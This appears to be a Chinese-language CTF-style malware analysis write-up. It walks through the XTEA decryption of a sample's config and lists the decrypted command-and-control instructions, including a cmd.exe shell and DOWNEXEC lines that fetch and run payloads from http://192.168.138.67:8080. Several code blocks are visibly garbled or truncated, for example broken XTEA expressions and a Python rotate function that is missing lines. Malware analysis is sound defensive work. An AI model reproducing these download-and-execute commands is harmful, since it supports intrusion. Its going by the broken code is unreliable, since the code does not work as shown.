
```c
char XTEA_KEY[16] = "ENCRYPTTRAFFIK07";
char *decrypt_XTEA_data(char *data, unsigned int size)
{
    int v4;           // ecx
    int v5;           // eax
    int v6;           // ecx
    int v7;           // eax
    char *v8;         // r15
    uint8_t *v9;      // rcx
    int64_t v10;      // rsi
    uint32_t *v11;    // rdi
    unsigned int v12; // ebx
    uint64_t v13;     // r9
    int64_t v14;      // r14
    unsigned int v15; // r10d
    unsigned int v16; // r11d
    unsigned int v17; // eax
    unsigned int v18; // ebx
    unsigned int v19; // r11d
    unsigned int v20; // r10d
    int v21;          // edx
    unsigned int v22; // r11d
    unsigned int v23; // r10d
    int v24;          // edx
    unsigned int v25; // r11d
    unsigned int v26; // r10d
    int v27;          // edx
    unsigned int v28; // r11d
    unsigned int v29; // r10d
    int v30;          // edx
    unsigned int v31; // r11d
    unsigned int v32; // r10d
    int v33;          // edx
    unsigned int v34; // r11d
    unsigned int v35; // r10d
    int v36;          // edx
    unsigned int v37; // r11d
    unsigned int v38; // r10d
    int v39;          // edx
    unsigned int v40; // r11d
    unsigned int v41; // r10d
    int v42;          // edx
    unsigned int v43; // r11d
    unsigned int v44; // r10d
    int v45;          // edx
    unsigned int v46; // r11d
    unsigned int v47; // r10d
    int v48;          // edx
    unsigned int v49; // r11d
    unsigned int v50; // r10d
    int v51;          // edx
    unsigned int v52; // r11d
    unsigned int v53; // r10d
    int v54;          // edx
    unsigned int v55; // r10d
    int v56;          // edx
    unsigned int v57; // r11d
    unsigned int v58; // r10d
    int v59;          // edx
    unsigned int v60; // r11d
    unsigned int v61; // r10d
    int v63[4];       // [rsp+20h] [rbp-10h]
    v4 = *(char *)(XTEA_KEY + 5) | (*(char *)(XTEA_KEY + 4) > 3) + 1;
        v11 = (uint32_t *)v8;
        do
        {
            v12 = 0xC6EF3720;
            v13 = 0xC6EF3720;
            v14 = 2;
            v15 = v9[1] | ((*v9 | ((*(v9 - 1) | (*(v9 - 2) > 11) & 3];
                v18 = v12 + 0x61C88647;
                v19 = v16 - (v17 ^ (v15 + ((16 * v15) ^ (v15 >> 5))));
                v20 = v15 - ((v18 + v63[v18 & 3]) ^ (v19 + ((16 * v19) ^ (v19 >> 5))));
                v21 = (v18 + v63[(v18 >> 11) & 3]) ^ (v20 + ((16 * v20) ^ (v20 >> 5))));
                v18 += 0x61C88647;
                v22 = v19 - v21;
                v23 = v20 - ((v18 + v63[v18 & 3]) ^ (v22 + ((16 * v22) ^ (v22 >> 5))));
                v24 = (v18 + v63[(v18 >> 11) & 3]) ^ (v23 + ((16 * v23) ^ (v23 >> 5))));
                v18 += 0x61C88647;
                v25 = v22 - v24;
                v26 = v23 - ((v18 + v63[v18 & 3]) ^ (v25 + ((16 * v25) ^ (v25 >> 5))));
                v27 = v18 + v63[(v18 >> 11) & 3];
                v18 += 0x61C88647;
                v28 = v25 - (v27 ^ (v26 + ((16 * v26) ^ (v26 >> 5))));
                v29 = v26 - ((v18 + v63[v18 & 3]) ^ (v28 + ((16 * v28) ^ (v28 >> 5))));
                v30 = (v18 + v63[(v18 >> 11) & 3]) ^ (v29 + ((16 * v29) ^ (v29 >> 5))));
                v18 += 0x61C88647;
                v31 = v28 - v30;
                v32 = v29 - ((v18 + v63[v18 & 3]) ^ (v31 + ((16 * v31) ^ (v31 >> 5))));
                v33 = (v18 + v63[(v18 >> 11) & 3]) ^ (v32 + ((16 * v32) ^ (v32 >> 5))));
                v18 += 0x61C88647;
                v34 = v31 - v33;
                v35 = v32 - ((v18 + v63[v18 & 3]) ^ (v34 + ((16 * v34) ^ (v34 >> 5))));
                v36 = v18 + v63[(v18 >> 11) & 3];
                v18 += 0x61C88647;
                v37 = v34 - (v36 ^ (v35 + ((16 * v35) ^ (v35 >> 5))));
                v38 = v35 - ((v18 + v63[v18 & 3]) ^ (v37 + ((16 * v37) ^ (v37 >> 5))));
                v39 = (v18 + v63[(v18 >> 11) & 3]) ^ (v38 + ((16 * v38) ^ (v38 >> 5))));
                v18 += 0x61C88647;
                v40 = v37 - v39;
                v41 = v38 - ((v18 + v63[v18 & 3]) ^ (v40 + ((16 * v40) ^ (v40 >> 5))));
                v42 = (v18 + v63[(v18 >> 11) & 3]) ^ (v41 + ((16 * v41) ^ (v41 >> 5))));
                v18 += 0x61C88647;
                v43 = v40 - v42;
                v44 = v41 - ((v18 + v63[v18 & 3]) ^ (v43 + ((16 * v43) ^ (v43 >> 5))));
                v45 = v18 + v63[(v18 >> 11) & 3];
                v18 += 0x61C88647;
                v46 = v43 - (v45 ^ (v44 + ((16 * v44) ^ (v44 >> 5))));
                v47 = v44 - ((v18 + v63[v18 & 3]) ^ (v46 + ((16 * v46) ^ (v46 >> 5))));
                v48 = (v18 + v63[(v18 >> 11) & 3]) ^ (v47 + ((16 * v47) ^ (v47 >> 5))));
                v18 += 0x61C88647;
                v49 = v46 - v48;
                v50 = v47 - ((v18 + v63[v18 & 3]) ^ (v49 + ((16 * v49) ^ (v49 >> 5))));
                v51 = (v18 + v63[(v18 >> 11) & 3]) ^ (v50 + ((16 * v50) ^ (v50 >> 5))));
                v18 += 0x61C88647;
                v52 = v49 - v51;
                v53 = v50 - ((v18 + v63[v18 & 3]) ^ (v52 + ((16 * v52) ^ (v52 >> 5))));
                v54 = v52 - ((v18 + v63[(v18 >> 11) & 3]) ^ (v53 + ((16 * v53) ^ (v53 >> 5))));
                v18 += 0x61C88647;
                v55 = v53 - ((v18 + v63[v18 & 3]) ^ (v54 + ((16 * v54) ^ (v54 >> 5))));
                v56 = (v18 + v63[(v18 >> 11) & 3]) ^ (v55 + ((16 * v55) ^ (v55 >> 5))));
                v18 += 0x61C88647;
                v57 = v54 - v56;
                v58 = v55 - ((v18 + v63[v18 & 3]) ^ (v57 + ((16 * v57) ^ (v57 >> 5))));
                v59 = (v18 + v63[(v18 >> 11) & 3]) ^ (v58 + ((16 * v58) ^ (v58 >> 5))));
                v18 += 0x61C88647;
                v60 = v57 - v59;
                v61 = v58 - ((v18 + v63[v18 & 3]) ^ (v60 + ((16 * v60) ^ (v60 >> 5))));
                v16 = v60 - ((v18 + v63[(v18 >> 11) & 3]) ^ (v61 + ((16 * v61) ^ (v61 >> 5))));
                v12 = v18 + 0x61C88647;
                v13 = v12;
                v15 = v61 - ((v12 + v63[v12 & 3]) ^ (v16 + ((16 * v16) ^ (v16 >> 5))));
                --v14;
            } while (v14);
            *v11 = _byteswap_ulong(v15);
            v9 += 8;
            v11[1] = _byteswap_ulong(v16);
            v11 += 2;
            --v10;
        } while (v10);
    }
    return v8;
}
```

提取所有的编码内容，解密

```
int main(void) {
    const char *base64_strings[] = {
        "RS1J1SxUJcq0y6CmpvlFHTUxUub0NrsRb96TEwoWI5GFR0RM/jkk9ZA",
        "RXUBvuF7XzYu3La0O/fiqLx3nHSXTn7Ghw==",
        "RT6v61YF2uq+B5OOcTNe7h8=RT6v61YF2uq+B5OOcTNe7h8=",
        "RSPPpIhlKGAsCmnkR3kD+uD5g30DH199VGWitl4BFgiF7LhZMn4GWFBrg40R9ty2p1pAStWd399I=",
        "RSPPpIhlKGAsCmnkR3kD+uD5g30DH199VGWitl4BFgiF7LhZMn4GWFDRIh1agXJSpaR7Fxcm+fFl"
    };
    int num_strings = sizeof(base64_strings) / sizeof(base64_strings[0]);
    for (int i = 0; i 
```

得到：

```
CMDSHEL|C:\windows\system32\cmd.exe
EXECCMD|cd %temp%
EXITSHEL
DOWNEXEC|http://192.168.138.67:8080/data.png|DEKRYPT|0
DOWNEXEC|http://192.168.138.67:8080/data.txt|DEKRYPT|1
```

然后可以在流量包里找到并导出 `data.png` 和 `data.txt`。

通过 `MZ` 标头，可以知道 `data.txt` 实际上是一个 PE 文件。

同时，编写一个函数，将命令名称转换为相应的 `DWORD`：

```
def rol(value, count, bits=32):
    """
    模拟给定位数的 __ROL__ (向左旋转) 函数。

    Args:
        value: 要旋转的整数值。
        count: 要向左旋转的位数（正数）。
               要向右旋转，请使用负数。
        bits: 值中的位数（默认 32，如 uint32）。

    Returns:
        向左旋转的整数值。
    """
    count %= bits  # 规范化计数
    if count > 0:
        high = value >> (bits - count)
        # 在 Python 中，我们不需要有符号检查和旋转掩码
        # 因为 Python 整数可以正确处理旋转的按位运算。
        value >= count
        value |= low
    return value & ((1 
```

然后可以得到相应的分支。（因为篇幅原因，本文中省略了关于其他分支的细节，但我确实分析了它们。）

其中，重点关注 `DOWNEXEC` 分支：

```
case 0xD68FEEF:
  v22 = strtok_s(0i64, Delimiter, &Context);
  v23 = strtok_s(0i64, Delimiter, &Context);
  v24 = StrToIntA(v23);
  v25 = (const WCHAR *)sub_140001920(v11);
  v26 = sub_140001920(v22);
  sub_140002890(v25, v26, v24);
```

跟进 `sub_140001920`：

```
void *__fastcall sub_140001920(char *SrcBuf)
{
  __int64 v1; // rax
  __int64 v3; // rcx
  bool v4; // zf
```
